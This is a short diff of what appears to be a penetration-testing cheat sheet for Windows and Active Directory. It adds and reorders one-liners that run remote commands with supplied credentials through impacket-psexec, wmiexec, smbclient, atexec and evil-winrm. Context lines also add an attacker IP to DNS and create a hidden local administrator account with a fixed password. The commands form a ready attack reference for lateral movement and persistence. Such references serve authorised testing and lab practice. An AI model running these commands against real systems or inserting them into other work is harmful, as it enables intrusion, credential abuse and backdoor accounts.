@@ -224,12 +224,12 @@ dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP 
 
 -->> Login or Execute Commands
 evil-winrm-py -i $TARGET -u '$USERNAME' -p '$PASSWORD'
-impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
-impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
-impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
 evil-winrm-py -i $DC -r $DOM
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
+impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
+impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
+impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
+impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 
 -->> Create Local Admin Account
 powershell -c "net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add"
